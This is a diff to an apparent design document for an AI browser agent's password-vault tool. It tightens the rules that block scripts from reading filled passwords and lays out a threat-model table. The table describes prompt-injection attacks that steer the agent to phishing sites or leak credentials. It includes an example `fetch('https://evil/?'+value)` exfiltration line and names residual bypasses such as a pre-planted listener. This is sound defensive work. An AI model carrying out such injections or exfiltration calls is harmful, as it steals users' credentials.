@@ -72,9 +72,9 @@ address bar, and the vault on by default.
   through iCloud. No 1Password or Bitwarden connection this time (section 4.2).
 - **One tool:** `browser_fill_credential` (item name, input field reference, kind). The result has no values and says
   only which fields were filled on which site (section 5.1).
-- **Leak paths:** `browser_evaluate` is refused only while a filled value is still in the field (usually lifted as soon
-  as the form is submitted). Screenshots mask filled fields, and every text result has strings equal to used values
-  scrubbed (section 5.3).
+- **Leak paths:** `browser_evaluate` is refused on a document once a value is filled into it, until a navigation or a
+  reload opens another document. Screenshots mask filled fields, and every text result has used values scrubbed, as
+  written and in their common encodings (section 5.3).
 - **Person confirmation step:** per item, "Always (including while away)", "While unlocked" or "Every time (Touch ID)".
   New items default to "Always" (section 6).
 - **Binding to sites:** the registrable domain (for `github.com`, also `www.github.com` and `gist.github.com`) must
@@ -365,7 +365,7 @@ Agent tools do not expose raw CDP, so the private key from `WebAuthn.getCredenti
 |---|---|
 | Tool arguments (text the model writes) | The model does not know the value. The arguments are only the item name and a reference |
 | Tool results | No value or length is written (section 5.1) |
-| Reading the field value with `browser_evaluate`, or `fetch` to the outside | Refused only while the filled value is still in the field. It lifts when the tab goes to another document (the main frame `loaderId` changes), or in an SPA when all filled nodes are detached or empty (only true or false is read from the isolated world). A sign-in form usually disappears on submit, so the agent rarely notices. A listener planted before the fill that intercepts the value is not blocked (user correction on 2026-10-24, residual risk in section 7) |
+| Reading the field value with `browser_evaluate`, or `fetch` to the outside | Refused on the document the value was filled into, whether or not the field still holds it. It lifts when the tab goes to another document (a main frame navigation or a reload); an SPA that keeps its document after signing in needs a reload first, which the refusal says. A listener planted before the fill that intercepts the value is not blocked (user correction on 2026-10-24, residual risk in section 7) |
 | `browser_snapshot` (accessibility tree) | Blink replaces a password field's accessibility value with • of the same length (`IsPasswordFieldAndShouldHideValue`, verified with CEF 154 in step 1 of section 12). Yardlet replaces that value with `<redacted>` too, so the length does not show (the same marker as Codex `browser-service.mjs`, section 10). This rule always applies, vault or not. As a backstop, "scrubbing matching strings" below covers TOTP fields and everything else |
 | `browser_screenshot` | If a filled node remains, its box (`DOM.getBoxModel`) is covered in black in the returned image. This also blocks injection that gets the agent to click "show password" |
 | Every text result (snapshot, `browser_wait_for`, console, JS dialog text, notes at the end of a result) | **Scrubbing matching strings:** any string equal to a value this task filled in the last 30 minutes is replaced with `[vault value]` (the same convention as GitHub Actions secret masking). This happens in the one place where `BrowserAgentTools.run(_:_:on:)` collects results. The values are only in memory and are discarded after 30 minutes |
@@ -425,9 +425,9 @@ Agent tools do not expose raw CDP, so the private key from `WebAuthn.getCredenti
 |---|---|---|---|
 | Prompt injection: getting the agent to fill a phishing page | Page text says "sign in on github-login.com with GitHub (work)" | Registrable domain match, origin from the browser, both top level and frame, https, refusal notification | XSS or a malicious third-party script on the legitimate site, or a subdomain someone else uses under the same registrable domain, can read the value (as with all autofill) |
 | Injection: the value into another field | Putting the password into a public bio field on the same site and saving | Field kind check (passwords only into `type=password`) | Cannot block a site that shows the password field's value somewhere else |
-| Injection: getting the value out through a URL, screenshot or result | `fetch('https://evil/?'+value)` through `browser_evaluate`, a screenshot after "show password" | Refusing `browser_evaluate` while filled, covering screenshots, scrubbing matching strings | A listener planted with `browser_evaluate` before the fill that intercepts the input is not blocked (a rule removed by the user correction on 2026-10-24). Site behavior that transforms the value and draws it on screen can also get past scrubbing |
+| Injection: getting the value out through a URL, screenshot or result | `fetch('https://evil/?'+value)` through `browser_evaluate`, a screenshot after "show password" | Refusing `browser_evaluate` on the filled document, covering screenshots, scrubbing the value and its common encodings | A listener planted with `browser_evaluate` before the fill that intercepts the input is not blocked (a rule removed by the user correction on 2026-10-24). Site behavior that transforms the value and draws it on screen can also get past scrubbing |
 | Injection: harmful actions on a legitimate site | Transferring money or deleting things after sign-in | The harness's approvals and permission modes, the step, the usage log | The vault helps only up to sign-in. Permission for what follows belongs to the harness and the user's permission settings |
-| Other apps on the same Mac | A program running as the same user reads the keychain | Items open only for the Developer ID requirement, vault off in ad-hoc builds | A program of the same user can read the `yardlet-mcp` token and call the fill tool (AGENT_BROWSER_TOOLS section 6). It cannot get values, but it can cause sign-ins with "Always" items. A trade-off of the same grade as the cookie database |
+| Other apps on the same Mac | A program running as the same user reads the keychain | Items open only for the Developer ID requirement, vault off in ad-hoc builds | A program of the same user can read the `yardlet-mcp` token, but a call must come from under the task's harness process (AGENT_BROWSER_TOOLS sections 4 and 6). It cannot get values |
 | Child tasks and other harnesses | Tasks made with `create_task`, Codex and ACP tasks, `run_agent` | The same rules (the tool goes to every harness that gets the browser tools), task and harness in the log | An injected parent can direct a child task. The step and site binding are the same whatever the task |
 | Backup and sync | Time Machine, moving to another Mac | The login keychain file is encrypted with the login password, and even when restored it opens only to Yardlet's signature. No iCloud sync | Yardlet passkeys exist only on this Mac, so if the Mac is lost, another sign-in method for the site is needed |
 | Tricking the person into using Touch ID | Confirming for the wrong site | Yardlet writes the Touch ID prompt: task title, site and item name. No page text goes into it | — |
@@ -588,8 +588,8 @@ installed app needs separate approval.
 - The Public Suffix List is bundled, so it updates only with app updates.
 - The save prompt listener's effect on page performance is limited to pages with a password field and measured in the
   step 4 QA.
-- The trade-off that a program of the same user can cause sign-ins with "Always" items through the `yardlet-mcp` token
-  remains, at the same grade as the cookie database (section 7).
+- Who may call the fill tool for a task follows AGENT_BROWSER_TOOLS section 4: the task's token, from under the
+  harness process Yardlet started for it (section 7).
 
 ### 12.1 Results (2026-10-24)
 
